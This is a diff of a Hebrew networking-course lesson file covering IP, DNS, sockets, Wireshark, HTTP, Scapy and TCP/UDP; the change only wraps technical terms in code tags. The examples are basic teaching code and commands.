@@ -106,7 +106,7 @@ export const tracks = [
         content: `
           <p>כדי לשלוח ולקבל הודעות באינטרנט, צריך לדעת לאן לשלוח.</p>
           <p>כמו במכתב — מציינים על המעטפה כתובת יעד וכתובת מקור.</p>
-          <p><strong>כתובות IP</strong></p>
+          <p><strong>כתובות <code>IP</code></strong></p>
           <p>באינטרנט, הכתובות נקראות כתובות <code>IP</code>.</p>
           <div class="diagram-container">
             <svg viewBox="0 0 340 70" class="content-diagram">
@@ -127,7 +127,7 @@ export const tracks = [
               <text x="315" y="50" text-anchor="middle" font-size="9" fill="var(--text-muted)">0-255</text>
               <text x="170" y="65" text-anchor="middle" font-size="12" fill="var(--accent)">192 . 168 . 1 . 105</text>
             </svg>
-            <p class="diagram-caption">מבנה כתובת IPv4 – ארבעה בתים מופרדים בנקודה</p>
+            <p class="diagram-caption">מבנה כתובת <code>IPv4</code> – ארבעה בתים מופרדים בנקודה</p>
           </div>
           <p>כתובות <code>IP</code> מורכבות מארבעה בתים.</p>
           <p>כל בית בטווח 0–255, מופרדים בנקודה.</p>
@@ -176,7 +176,7 @@ Reply from 31.13.72.65: bytes=32 time=42ms TTL=56</code></pre>
         type: "explanation",
         title: "traceroute – מסלול ההודעה",
         content: `
-          <p><strong>traceroute</strong></p>
+          <p><strong><code>traceroute</code></strong></p>
           <p>כלי שמציג את הדרך שעוברת הודעה מהמחשב שלנו אל היעד.</p>
           <p>כל שורה בפלט מייצגת רכיב אחד — נתב או שרת — שהחבילה עברה דרכו.</p>
           <p>כל צעד כזה נקרא <code>hop</code>.</p>
@@ -188,29 +188,29 @@ Reply from 31.13.72.65: bytes=32 time=42ms TTL=56</code></pre>
         type: "explanation",
         title: "DNS – מתרגם שם ל-IP",
         content: `
-          <p><strong>DNS</strong> — <code>Domain Name System</code></p>
+          <p><strong><code>DNS</code></strong> — <code>Domain Name System</code></p>
           <p>מערכת שמתרגמת שמות דומיין לכתובות <code>IP</code>.</p>
-          <p>דוגמה: השם <code>www.facebook.com</code> מתורגם לכתובת IP מספרית.</p>
-          <p>הפקודה <code>nslookup www.facebook.com</code> שולחת שאילתת DNS ומציגה את כתובת ה־IP.</p>
+          <p>דוגמה: השם <code>www.facebook.com</code> מתורגם לכתובת <code>IP</code> מספרית.</p>
+          <p>הפקודה <code>nslookup www.facebook.com</code> שולחת שאילתת <code>DNS</code> ומציגה את כתובת ה־<code>IP</code>.</p>
         `
       },
       {
         type: "simulation",
         title: "הדמיית DNS – תרגום דומיין ל־IP",
         simId: "dnsLookup",
-        content: `<p>הדמיה של תהליך ה־DNS: הכניסו דומיין (למשל google.com) ולחצו "חפש IP" – המדריך מדגים את הזרימה.</p>`
+        content: `<p>הדמיה של תהליך ה־<code>DNS</code>: הכניסו דומיין (למשל google.com) ולחצו "חפש <code>IP</code>" – המדריך מדגים את הזרימה.</p>`
       },
       {
         type: "simulation",
         title: "הדמיית מסלול חבילה ברשת",
         simId: "packetFlow",
-        content: `<p>לחצו "הרץ מסלול" כדי לראות איך חבילה עוברת ממחשב דרך Switch ונתבים עד לשרת – כל צעד בנפרד.</p>`
+        content: `<p>לחצו "הרץ מסלול" כדי לראות איך חבילה עוברת ממחשב דרך <code>Switch</code> ונתבים עד לשרת – כל צעד בנפרד.</p>`
       },
       {
         type: "explanation",
         title: "GeoIP – מיקום גיאוגרפי",
         content: `
-          <p><strong>GeoIP</strong> — מיקום גיאוגרפי לפי כתובת <code>IP</code></p>
+          <p><strong><code>GeoIP</code></strong> — מיקום גיאוגרפי לפי כתובת <code>IP</code></p>
           <p>ישנם מאגרי נתונים הכוללים מידע על המיקום הגיאוגרפי של כתובות <code>IP</code>.</p>
           <p>בהינתן כתובת <code>IP</code>, ניתן לדעת באיזו מדינה ועיר היא נמצאת.</p>
           <p>המיפוי אינו רשמי ולא מדויק, אך נותן מענה נכון ברוב המקרים.</p>
@@ -254,9 +254,9 @@ Reply from 31.13.72.65: bytes=32 time=42ms TTL=56</code></pre>
             title: "מה קורה כשחבילה הולכת לאיבוד?",
             icon: "❓",
             content: `
-              <p><strong>ב־TCP</strong></p>
+              <p><strong>ב־<code>TCP</code></strong></p>
               <p>השולח לא מקבל <code>ACK</code>, מחכה עד שפג הזמן — <code>timeout</code> — ושולח שוב.</p>
-              <p><strong>ב־UDP</strong></p>
+              <p><strong>ב־<code>UDP</code></strong></p>
               <p>אף אחד לא שם לב.</p>
               <p>היישום אולי יבחין בבעיה — סרטון שקופץ, שיחה שנקטעת — ואולי לא.</p>
               <p>הרשת לא "יודעת" מה חשוב — רק הפרוטוקולים והיישומים מחליטים.</p>
@@ -333,7 +333,7 @@ Addresses:  142.250.185.46
         type: "explanation",
         title: "מהו Socket?",
         content: `
-          <p><strong>Socket</strong></p>
+          <p><strong><code>Socket</code></strong></p>
           <p>ממשק שמאפשר לתקשר בין שני מחשבים.</p>
           <p>כמתוכנתים, כל מה שצריך הוא: כתובת המחשב המרוחק, הפורט שעליו הוא מאזין, והתחברות.</p>
           <p>ה־<code>Socket</code> מפשט את כל תהליך התקשורת שקורה בפועל ברשת.</p>
@@ -345,7 +345,7 @@ Addresses:  142.250.185.46
         title: "מודל שרת-לקוח ב-Sockets",
         content: `
           <p>ניתן לדמות את התקשורת לשליחת מכתב בין שתי משפחות בבניין רב קומות.</p>
-          <p><strong>כתובת ה־IP</strong> — מזהה הבניין — מזהה הרכיב.</p>
+          <p><strong>כתובת ה־<code>IP</code></strong> — מזהה הבניין — מזהה הרכיב.</p>
           <p><strong>הפורט</strong> — 0–65535 — מזהה הדירה — מזהה התוכנה.</p>
           <p>השרת מאזין על פורט מסוים ומחכה לחיבורים.</p>
           <p>הלקוח מתחבר לכתובת ולפורט, ושולח ומקבל הודעות.</p>
@@ -370,7 +370,7 @@ my_socket.close()</code></pre>
             <p>📋 <strong>הסבר הפונקציות:</strong></p>
             <ul>
               <li><code>socket()</code> — יוצר אובייקט socket</li>
-              <li><code>connect()</code> — מתחבר ל־IP:Port</li>
+              <li><code>connect()</code> — מתחבר ל־<code>IP</code>:<code>Port</code></li>
               <li><code>send()</code> — שולח bytes (חובה <code>b'...'</code>, לא string)</li>
               <li><code>recv()</code> — מקבל נתונים — <code>blocking</code> — עוצר עד לקבלת מידע</li>
               <li><code>decode()</code> — ממיר bytes לטקסט</li>
@@ -400,7 +400,7 @@ server_socket.close()</code></pre>
           <div class="demo-note">
             <p>📋 <strong>הסבר הפונקציות:</strong></p>
             <ul>
-              <li><code>bind()</code> — מקשיר את השרת ל־IP ולפורט</li>
+              <li><code>bind()</code> — מקשיר את השרת ל־<code>IP</code> ולפורט</li>
               <li><code>listen()</code> — מתחיל להאזין לחיבורים</li>
               <li><code>accept()</code> — מחכה לחיבור — <code>blocking</code> — ומחזיר <code>socket</code> של הלקוח וכתובתו</li>
               <li><code>recv()</code> — מקבל <code>bytes</code>. <code>decode()</code> ממיר לטקסט. מחזיר <code>b''</code> ריק אם הלקוח התנתק</li>
@@ -489,7 +489,7 @@ server_socket.close()</code></pre>
         title: "מה קורה כשאנחנו מתקשרים?",
         content: `
           <p>ב־<code>Sockets</code> היה לנו נוח — לא ראינו מה באמת עובר ברשת.</p>
-          <p><strong>Wireshark</strong></p>
+          <p><strong><code>Wireshark</code></strong></p>
           <p>כלי שמאפשר לחקור את המידע שיוצא ונכנס בכרטיס הרשת.</p>
           <p>רואים בדיוק מה עובר כשמדברים עם מחשב מרוחק.</p>
           <p>בפרק זה נציג גם את <strong>מודל חמש השכבות</strong> — מודל לוגי שמחלק את פעולות מערכת התקשורת לחמישה חלקים.</p>
@@ -501,7 +501,7 @@ server_socket.close()</code></pre>
         content: `
           <p>העברת מידע בין רכיבי האינטרנט — מחשבים, שרתים, נתבים — היא משימה מורכבת.</p>
           <p>ארגון התקינה הבינלאומי — <code>ISO</code> — יצר את <strong>מודל שבע השכבות</strong> — <code>OSI</code> — כדי לארגן את כל זה.</p>
-          <p>בספר משתמשים ב־<strong>מודל חמש השכבות</strong> — דומה ל־OSI, אך ללא שתי שכבות שהתגלו כמיותרות.</p>
+          <p>בספר משתמשים ב־<strong>מודל חמש השכבות</strong> — דומה ל־<code>OSI</code>, אך ללא שתי שכבות שהתגלו כמיותרות.</p>
           <p>המודל מנחה כיצד צריכה להיראות תקשורת, ללא תלות ביצרן החומרה.</p>
         `
       },
@@ -568,9 +568,9 @@ server_socket.close()</code></pre>
         type: "explanation",
         title: "Encapsulation ו-Decapsulation",
         content: `
-          <p><strong>Encapsulation</strong> — כימוס — בשליחה</p>
+          <p><strong><code>Encapsulation</code></strong> — כימוס — בשליחה</p>
           <p>כל שכבה מקבלת מהשכבה שמעליה את הפקטה, מוסיפה <code>Header</code> בתחילתה, ומעבירה לשכבה שמתחת.</p>
-          <p><strong>Decapsulation</strong> — בקבלה</p>
+          <p><strong><code>Decapsulation</code></strong> — בקבלה</p>
           <p>השכבה התחתונה מקבלת את הפקטה, מקלפת את ה־<code>Header</code> שלה, ומעבירה את ה־<code>Data</code> לשכבה שמעל.</p>
           <p>ה־<code>Header</code> שכל שכבה מוסיפה מכיל: כתובת, בקרת שגיאות ועוד.</p>
         `
@@ -579,7 +579,7 @@ server_socket.close()</code></pre>
         type: "simulation",
         title: "הדמיית Encapsulation / Decapsulation",
         simId: "encapsulation",
-        content: `<p>לחצו על "Encapsulation" כדי לראות איך כל שכבה מוסיפה Header בשליחה. לחצו "Decapsulation" לראות איך מקלפים בקבלה.</p>`
+        content: `<p>לחצו על "<code>Encapsulation</code>" כדי לראות איך כל שכבה מוסיפה <code>Header</code> בשליחה. לחצו "<code>Decapsulation</code>" לראות איך מקלפים בקבלה.</p>`
       },
       {
         type: "explanation",
@@ -589,7 +589,7 @@ server_socket.close()</code></pre>
           <p><code>Ethernet Header</code> + <code>IP Header</code> + <code>TCP Header</code> + <code>Data</code></p>
           <p>ה־<code>Data</code> של שכבה n הוא הפקטה המלאה של שכבה n+1, כולל ה־<code>Header</code> שלה.</p>
           <p>בשכבת הקו יש גם <code>Trailer</code> בסוף המסגרת.</p>
-          <p><strong>Wireshark</strong> מציג את המבנה הזה לפי שכבות.</p>
+          <p><strong><code>Wireshark</code></strong> מציג את המבנה הזה לפי שכבות.</p>
           <p>אפשר להשתמש במסננים כדי לסנן לפי פרוטוקול.</p>
           <p>לדוגמה: <code>http</code> או <code>dns</code>.</p>
         `
@@ -605,7 +605,7 @@ server_socket.close()</code></pre>
                 <div class="lc-num">5</div>
                 <div class="lc-text">
                   <strong>שכבת אפליקציה</strong>
-                  <span class="lc-proto">HTTP · HTTPS · DNS · FTP · SMTP</span>
+                  <span class="lc-proto"><code>HTTP</code> · <code>HTTPS</code> · <code>DNS</code> · <code>FTP</code> · <code>SMTP</code></span>
                   <p>הממשק הישיר עם המשתמש.</p>
                   <p>האפליקציה בונה בקשה בשפה מובנת — <code>HTTP GET</code> — והשרת מחזיר תגובה.</p>
                 </div>
@@ -635,7 +635,7 @@ server_socket.close()</code></pre>
                 <div class="lc-num">4</div>
                 <div class="lc-text">
                   <strong>שכבת תעבורה</strong>
-                  <span class="lc-proto">TCP · UDP</span>
+                  <span class="lc-proto"><code>TCP</code> · <code>UDP</code></span>
                   <p>אחראית על העברה אמינה בין <em>תהליכים</em> — פורטים.</p>
                   <p><code>TCP</code> מבטיח סדר ואישור קבלה.</p>
                   <p><code>UDP</code> מהיר ללא אישור.</p>
@@ -665,7 +665,7 @@ server_socket.close()</code></pre>
                 <div class="lc-num">3</div>
                 <div class="lc-text">
                   <strong>שכבת רשת</strong>
-                  <span class="lc-proto">IP · ICMP · OSPF · BGP</span>
+                  <span class="lc-proto"><code>IP</code> · <code>ICMP</code> · <code>OSPF</code> · <code>BGP</code></span>
                   <p>ניתוב חבילות בין רשתות שונות ברחבי האינטרנט.</p>
                   <p>הנתב — <code>Router</code> — מחליט את המסלול לפי כתובת <code>IP</code>.</p>
                 </div>
@@ -694,8 +694,8 @@ server_socket.close()</code></pre>
               <div class="lc-info">
                 <div class="lc-num">2</div>
                 <div class="lc-text">
-                  <strong>שכבת קו (Data Link)</strong>
-                  <span class="lc-proto">Ethernet · Wi-Fi · PPP</span>
+                  <strong>שכבת קו (<code>Data Link</code>)</strong>
+                  <span class="lc-proto"><code>Ethernet</code> · <code>Wi-Fi</code> · <code>PPP</code></span>
                   <p>אחראית על העברה בין שני <em>צמתים סמוכים</em>.</p>
                   <p>מארגנת <code>Frames</code> עם כתובות <code>MAC</code> ובדיקת שגיאות — <code>CRC</code>.</p>
                 </div>
@@ -727,7 +727,7 @@ server_socket.close()</code></pre>
                 <div class="lc-num">1</div>
                 <div class="lc-text">
                   <strong>שכבה פיזית</strong>
-                  <span class="lc-proto">Cat5e · Cat6 · Fiber · Wi-Fi · USB</span>
+                  <span class="lc-proto"><code>Cat5e</code> · <code>Cat6</code> · <code>Fiber</code> · <code>Wi-Fi</code> · <code>USB</code></span>
                   <p>מעבירה <em>ביטים</em> — 0/1 — כאותות חשמליים, אורים, או גלי רדיו.</p>
                   <p>אין לה מושג מה המשמעות — רק פיזיקה.</p>
                 </div>
@@ -778,8 +778,8 @@ server_socket.close()</code></pre>
           <p><strong>סינון</strong></p>
           <p>בשדה <code>Filter</code> מקלידים ביטוי סינון ולוחצים Enter. דוגמאות:</p>
           <ul>
-            <li><code>http</code> — רק תעבורת HTTP</li>
-            <li><code>dns</code> — רק שאילתות DNS</li>
+            <li><code>http</code> — רק תעבורת <code>HTTP</code></li>
+            <li><code>dns</code> — רק שאילתות <code>DNS</code></li>
             <li><code>ip.addr==192.168.1.1</code> — חבילות שמכילות כתובת מסוימת</li>
           </ul>
           <p><strong>צפייה בחבילה</strong></p>
@@ -825,7 +825,7 @@ server_socket.close()</code></pre>
         type: "explanation",
         title: "פרוטוקול HTTP – בקשה ותגובה",
         content: `
-          <p><strong>HTTP</strong> — <code>Hypertext Transfer Protocol</code></p>
+          <p><strong><code>HTTP</code></strong> — <code>Hypertext Transfer Protocol</code></p>
           <p>הפרוטוקול הנפוץ ביותר לשכבת האפליקציה — הוא מניע את הגלישה באינטרנט.</p>
           <p>משתמש בעקרון "בקשה-תגובה": הלקוח שולח בקשה, השרת מחזיר תגובה.</p>
           <p><strong>שורת בקשה לדוגמה:</strong></p>
@@ -844,7 +844,7 @@ server_socket.close()</code></pre>
           <p><strong>מבנה שורת בקשה:</strong> <code>METHOD URL HTTP/VERSION</code></p>
           <p><strong>דוגמה:</strong></p>
           <p><code>GET /index.html HTTP/1.1</code></p>
-          <p>ה־URL כאן הוא path יחסי — ללא הדומיין, כי השרת כבר ידוע מהחיבור.</p>
+          <p>ה־<code>URL</code> כאן הוא path יחסי — ללא הדומיין, כי השרת כבר ידוע מהחיבור.</p>
           <p><strong>Headers</strong> — כל שורה בפורמט <code>שם: ערך</code>:</p>
           <ul>
             <li><code>Host: www.example.com</code></li>
@@ -857,7 +857,7 @@ server_socket.close()</code></pre>
         type: "demo",
         title: "המדריך מדגים: שימוש ב־telnet לבקשת HTTP",
         content: `
-          <p>ב־telnet אפשר להתחבר ידנית לשרת HTTP ולשלוח בקשה. הנה מה שמקלידים ומה שמתקבל:</p>
+          <p>ב־<code>telnet</code> אפשר להתחבר ידנית לשרת <code>HTTP</code> ולשלוח בקשה. הנה מה שמקלידים ומה שמתקבל:</p>
           <div class="code-preview">
             <pre><code>$ telnet www.example.com 80
 GET / HTTP/1.0
@@ -881,7 +881,7 @@ Content-Type: text/html
         type: "demo",
         title: "המדריך מדגים: שרת HTTP פשוט בפייתון",
         content: `
-          <p>זה הקוד לשרת HTTP מינימלי שמחזיר דף קבוע:</p>
+          <p>זה הקוד לשרת <code>HTTP</code> מינימלי שמחזיר דף קבוע:</p>
           <div class="code-preview">
             <pre><code>import socket
 s = socket.socket()
@@ -913,7 +913,7 @@ client.close()</code></pre>
             <li><strong>404</strong> <code>Not Found</code> — המשאב לא נמצא</li>
             <li><strong>500</strong> <code>Server Error</code> — שגיאה בשרת</li>
           </ul>
-          <p>רשימה מלאה: <a href="http://goo.gl/COC4J7" target="_blank">קודי HTTP</a></p>
+          <p>רשימה מלאה: <a href="http://goo.gl/COC4J7" target="_blank">קודי <code>HTTP</code></a></p>
 
           <p><strong>Headers</strong></p>
           <p>מעבר לשורת הבקשה או התגובה, יש שדות מידע בפורמט <code>שם: ערך</code>.</p>
@@ -930,11 +930,11 @@ client.close()</code></pre>
         type: "explanation",
         title: "פרוטוקול DNS",
         content: `
-          <p><strong>DNS</strong> — <code>Domain Name System</code></p>
+          <p><strong><code>DNS</code></strong> — <code>Domain Name System</code></p>
           <p>ממיר שמות דומיין לכתובות <code>IP</code>.</p>
-          <p>הדפדפן לא יודע איך לפנות ל־<code>google.com</code> — הוא צריך כתובת IP מספרית.</p>
+          <p>הדפדפן לא יודע איך לפנות ל־<code>google.com</code> — הוא צריך כתובת <code>IP</code> מספרית.</p>
           <p>שרת ה־<code>DNS</code>, שכתובתו מתקבלת דרך <code>DHCP</code>, עונה על שאילתות ומחזיר את כתובת ה־<code>IP</code> המתאימה.</p>
-          <p>הפקודה <code>nslookup www.google.com</code> מבצעת שאילתת DNS ומציגה את הכתובת.</p>
+          <p>הפקודה <code>nslookup www.google.com</code> מבצעת שאילתת <code>DNS</code> ומציגה את הכתובת.</p>
         `
       },
       {
@@ -955,7 +955,7 @@ client.close()</code></pre>
         type: "explanation",
         title: "משאבי רשת – URL מלא",
         content: `
-          <p><strong>URL</strong> — <code>Uniform Resource Locator</code></p>
+          <p><strong><code>URL</code></strong> — <code>Uniform Resource Locator</code></p>
           <p>מזהה משאב ברשת.</p>
           <p><strong>מבנה:</strong> <code>פרוטוקול://דומיין:פורט/נתיב?שאילתה</code></p>
           <p><strong>דוגמה:</strong> <code>https://www.google.com/maps?q=תל+אביב</code></p>
@@ -965,18 +965,18 @@ client.close()</code></pre>
             <li><code>/maps</code> — נתיב</li>
             <li><code>?q=תל+אביב</code> — פרמטר חיפוש</li>
           </ul>
-          <p>כל משאב ברשת — דף, תמונה, API — מזוהה ב־URL ייחודי.</p>
+          <p>כל משאב ברשת — דף, תמונה, API — מזוהה ב־<code>URL</code> ייחודי.</p>
         `
       },
       {
         type: "explanation",
         title: "מפות Google – דוגמה למשאבי רשת",
         content: `
-          <p>כשפותחים מפות Google ומחפשים מקום, הדפדפן שולח בקשות HTTP לשרתי Google.</p>
-          <p>ה־URL משתנה לפי החיפוש:</p>
+          <p>כשפותחים מפות Google ומחפשים מקום, הדפדפן שולח בקשות <code>HTTP</code> לשרתי Google.</p>
+          <p>ה־<code>URL</code> משתנה לפי החיפוש:</p>
           <p><code>https://www.google.com/maps/search/...</code></p>
           <p>השרת מחזיר מפות, תמונות ונתונים.</p>
-          <p>זוהי דוגמה לשכבת האפליקציה — פרוטוקול HTTP משרת את היישום שמציג מידע למשתמש.</p>
+          <p>זוהי דוגמה לשכבת האפליקציה — פרוטוקול <code>HTTP</code> משרת את היישום שמציג מידע למשתמש.</p>
         `
       },
       {
@@ -988,7 +988,7 @@ client.close()</code></pre>
             <ul>
               <li>שכבת האפליקציה = פרוטוקולים שהאפליקציות משתמשות בהם ישירות</li>
               <li><code>HTTP</code> = פרוטוקול בקשה-תגובה. מבנה: שורות מופרדות ב־<code>\\r\\n</code>, שורה ריקה לפני גוף</li>
-              <li>בקשה: METHOD URL HTTP/VERSION, Headers (שם:ערך), גוף (אם יש)</li>
+              <li>בקשה: <code>METHOD</code> <code>URL</code> <code>HTTP/VERSION</code>, <code>Headers</code> (שם:ערך), גוף (אם יש)</li>
               <li><code>GET</code> — הבאה, <code>POST</code> — שליחה. <code>URL</code> מזהה משאב: פרוטוקול://דומיין/נתיב</li>
               <li><code>telnet</code> + ידני או שרת <code>Python</code> = בדיקת <code>HTTP</code></li>
             </ul>
@@ -1023,10 +1023,10 @@ client.close()</code></pre>
         type: "explanation",
         title: "מבוא ל-Scapy",
         content: `
-          <p><strong>Scapy</strong></p>
+          <p><strong><code>Scapy</code></strong></p>
           <p>ספרייה לפייתון לעבודה עם חבילות רשת ברמה נמוכה.</p>
           <p>בניגוד ל־<code>Sockets</code> שעובד בשכבת האפליקציה, <code>Scapy</code> נותן גישה לשכבות התעבורה, הרשת והקו.</p>
-          <p><strong>מה אפשר לעשות עם Scapy:</strong></p>
+          <p><strong>מה אפשר לעשות עם <code>Scapy</code>:</strong></p>
           <ul>
             <li>להסניף תעבורת <code>HTTP</code> ולשמור כתובות שאליהן הייתה גלישה</li>
             <li>לסנן חבילות לפי תנאים</li>
@@ -1062,7 +1062,7 @@ client.close()</code></pre>
         content: `
           <p>ניתן לסנן חבילות בהסנפה באמצעות פרמטר <code>lfilter</code>.</p>
           <p><code>lfilter</code> מקבל פונקציה שמקבלת חבילה ומחזירה True/False.</p>
-          <p><strong>דוגמה:</strong> סינון רק חבילות DNS:</p>
+          <p><strong>דוגמה:</strong> סינון רק חבילות <code>DNS</code>:</p>
           <div class="code-preview">
             <pre><code>def filter_dns(packet):
     return DNS in packet
@@ -1090,7 +1090,7 @@ packets = sniff(count=10, lfilter=filter_dns)</code></pre>
           <p>אפשר לקבוע שדות ספציפיים:</p>
           <ul>
             <li><code>IP(dst="1.2.3.4", ttl=5)</code></li>
-            <li><code>TCP(dport=80, flags="S")</code> — דגל SYN</li>
+            <li><code>TCP(dport=80, flags="S")</code> — דגל <code>SYN</code></li>
           </ul>
         `
       },
@@ -1123,11 +1123,11 @@ packets = sniff(count=10, lfilter=filter_dns)</code></pre>
         content: `
           <p>לאחר <code>sniff</code>, כל חבילה מכילה שדות של כל שכבה. דוגמאות לגישה לשדות:</p>
           <ul>
-            <li><code>p[IP].src</code> — כתובת IP מקור</li>
-            <li><code>p[IP].dst</code> — כתובת IP יעד</li>
+            <li><code>p[IP].src</code> — כתובת <code>IP</code> מקור</li>
+            <li><code>p[IP].dst</code> — כתובת <code>IP</code> יעד</li>
             <li><code>p[TCP].sport</code> — פורט מקור</li>
             <li><code>p[TCP].dport</code> — פורט יעד</li>
-            <li><code>p.haslayer(DNS)</code> — בודק אם החבילה מכילה שכבת DNS</li>
+            <li><code>p.haslayer(DNS)</code> — בודק אם החבילה מכילה שכבת <code>DNS</code></li>
           </ul>
           <p>כך אפשר לחלץ כתובות <code>URL</code> מחבילות <code>HTTP</code>, כתובות <code>DNS</code>, ונתונים נוספים לניתוח.</p>
         `
@@ -1185,7 +1185,7 @@ packets = sniff(count=10, lfilter=filter_dns)</code></pre>
         title: "פורטים (Ports)",
         content: `
           <p>מזהה התוכנה על השרת נקרא <strong>פורט</strong>.</p>
-          <p>כתובת IP = הבניין, פורט = הדירה. בפניה לפורט מסוים, השרת יודע לאיזו תוכנה פונים.</p>
+          <p>כתובת <code>IP</code> = הבניין, פורט = הדירה. בפניה לפורט מסוים, השרת יודע לאיזו תוכנה פונים.</p>
           <div class="diagram-container">
             <svg viewBox="0 0 320 100" class="content-diagram">
               <rect x="40" y="10" width="120" height="80" rx="6" fill="var(--bg-elevated)" stroke="var(--accent)"/>
@@ -1198,7 +1198,7 @@ packets = sniff(count=10, lfilter=filter_dns)</code></pre>
               <text x="107" y="85" text-anchor="middle" font-size="8" fill="var(--text-muted)">HTTPS</text>
               <text x="147" y="85" text-anchor="middle" font-size="8" fill="var(--text-muted)">אימייל</text>
             </svg>
-            <p class="diagram-caption">IP = בניין, פורט = דירה. כל שירות מאזין על פורט אחר</p>
+            <p class="diagram-caption"><code>IP</code> = בניין, פורט = דירה. כל שירות מאזין על פורט אחר</p>
           </div>
           <p>לדוגמה: פורט 80 — ב־<code>TCP</code> — = שירות <code>HTTP</code>.</p>
           <p>אם נשלח הודעה לפורט 80, השרת מבין שמדובר בבקשת דף אינטרנט.</p>
@@ -1219,7 +1219,7 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
           <div class="demo-note">
           <p>📋 פירוש העמודות:</p>
           <ul>
-            <li><strong>כתובת מקומית</strong> — ה־IP והפורט שעליהם המחשב מאזין. <code>0.0.0.0:80</code> = שירות HTTP פתוח לכולם.</li>
+            <li><strong>כתובת מקומית</strong> — ה־<code>IP</code> והפורט שעליהם המחשב מאזין. <code>0.0.0.0:80</code> = שירות <code>HTTP</code> פתוח לכולם.</li>
             <li><strong>מצב האזנה</strong> — פורט שמחכה לחיבורים נכנסים.</li>
             <li><strong>מחובר</strong> — חיבור פעיל כרגע.</li>
           </ul>
@@ -1229,7 +1229,7 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
         type: "explanation",
         title: "TCP לעומת UDP",
         content: `
-          <p><strong>TCP</strong> — פרוטוקול אמין</p>
+          <p><strong><code>TCP</code></strong> — פרוטוקול אמין</p>
           <p>מבטיח שכל המידע יגיע בסדר הנכון.</p>
           <p>דורש <code>Handshake</code> לפני שליחת נתונים.</p>
           <p><strong>מתאים ל:</strong></p>
@@ -1239,14 +1239,14 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
             <li>העברת קבצים</li>
           </ul>
 
-          <p><strong>UDP</strong> — פרוטוקול קל ומהיר</p>
+          <p><strong><code>UDP</code></strong> — פרוטוקול קל ומהיר</p>
           <p>שולח חבילות בלי לוודא שהגיעו.</p>
           <p>אין ערבויות על סדר או שלמות הנתונים.</p>
           <p><strong>מתאים ל:</strong></p>
           <ul>
             <li>שיחות וידאו וקול — <code>Zoom</code>, <code>Discord</code></li>
             <li>משחקים מרובי משתתפים</li>
-            <li>שאילתות DNS</li>
+            <li>שאילתות <code>DNS</code></li>
           </ul>
 
           <p><strong>הערה חשובה:</strong></p>
@@ -1258,11 +1258,11 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
         type: "explanation",
         title: "TCP Handshake – שלושת השלבים",
         content: `
-          <p>לפני העברת מידע, TCP מבצע <strong>Handshake</strong> בן שלושה שלבים:</p>
+          <p>לפני העברת מידע, <code>TCP</code> מבצע <strong><code>Handshake</code></strong> בן שלושה שלבים:</p>
           <ol>
-            <li>הלקוח שולח <strong>SYN</strong> — "אני רוצה להתחבר"</li>
-            <li>השרת עונה <strong>SYN-ACK</strong> — "מאושר, מתחברים"</li>
-            <li>הלקוח שולח <strong>ACK</strong> — "קיבלתי"</li>
+            <li>הלקוח שולח <strong><code>SYN</code></strong> — "אני רוצה להתחבר"</li>
+            <li>השרת עונה <strong><code>SYN-ACK</code></strong> — "מאושר, מתחברים"</li>
+            <li>הלקוח שולח <strong><code>ACK</code></strong> — "קיבלתי"</li>
           </ol>
           <p>רק אחרי שלושת השלבים האלה מתחילה העברת המידע.</p>
           <p>לסגירת החיבור משתמשים בדגל <code>FIN</code> או <code>RST</code>.</p>
@@ -1281,19 +1281,19 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
         type: "simulation",
         title: "הדמיית TCP Handshake",
         simId: "tcpHandshake",
-        content: `<p>לחצו "הרץ הדמיה" כדי לראות את שלושת השלבים בזרימה – SYN, SYN-ACK, ACK.</p>`
+        content: `<p>לחצו "הרץ הדמיה" כדי לראות את שלושת השלבים בזרימה – <code>SYN</code>, <code>SYN-ACK</code>, <code>ACK</code>.</p>`
       },
       {
         type: "explanation",
         title: "Sequence number ו־Acknowledgment",
         content: `
-          <p><strong>Sequence Number</strong> — מספר סידורי</p>
+          <p><strong><code>Sequence Number</code></strong> — מספר סידורי</p>
           <p>מזהה את סדר הבייטים שנשלחים.</p>
           <p>כל צד מתחיל ממספר אקראי ומוסיף 1 לכל בייט שנשלח.</p>
 
-          <p><strong>Acknowledgment</strong> — אישור קבלה</p>
+          <p><strong><code>Acknowledgment</code></strong> — אישור קבלה</p>
           <p>הצד המקבל שולח: "קיבלתי עד בייט X, שלח את הבא."</p>
-          <p>כך TCP מאשר קבלה ומזהה אובדן — אם <code>ACK</code> לא חוזר בזמן, השולח שולח שוב.
+          <p>כך <code>TCP</code> מאשר קבלה ומזהה אובדן — אם <code>ACK</code> לא חוזר בזמן, השולח שולח שוב.
         `
       },
       {
@@ -1320,10 +1320,10 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
           <p>פורטים שמורים לשירותים מוכרים.</p>
           <p>השרת מאזין עליהם:</p>
           <ul>
-            <li><code>80</code> — HTTP</li>
-            <li><code>443</code> — HTTPS</li>
+            <li><code>80</code> — <code>HTTP</code></li>
+            <li><code>443</code> — <code>HTTPS</code></li>
             <li><code>25</code> — <code>SMTP</code> — אימייל</li>
-            <li><code>53</code> — DNS</li>
+            <li><code>53</code> — <code>DNS</code></li>
           </ul>
 
           <p><strong>פורטים חולפים</strong> — <code>Ephemeral</code></p>
@@ -1389,7 +1389,7 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
         title: "חבילות (Packets)",
         content: `
           <p>המידע מחולק לחבילות.</p>
-          <p>בשכבת הרשת קוראים להן <strong>Packets</strong> — פקטות.</p>
+          <p>בשכבת הרשת קוראים להן <strong><code>Packets</code></strong> — פקטות.</p>
           <p>כל חבילה מכילה את המידע עצמו, ומידע על כתובת המקור והיעד.</p>
           <p>הרכיבים בדרך משתמשים בכתובות כדי לדעת לאן להעביר כל חבילה.</p>
           <p>רוב המידע באינטרנט מועבר בשכבת הרשת, ולכן נוהגים לכנות כל יחידת מידע כזו "פקטה".</p>
@@ -1399,14 +1399,14 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
         type: "explanation",
         title: "מבנה חבילת IP – Header ושדות",
         content: `
-          <p>חבילת IP כוללת <strong>IP Header</strong> ולאחריו Data. הגודל המינימלי של ה־Header הוא 20 בתים.</p>
-          <p>שדות עיקריים ב־Header:</p>
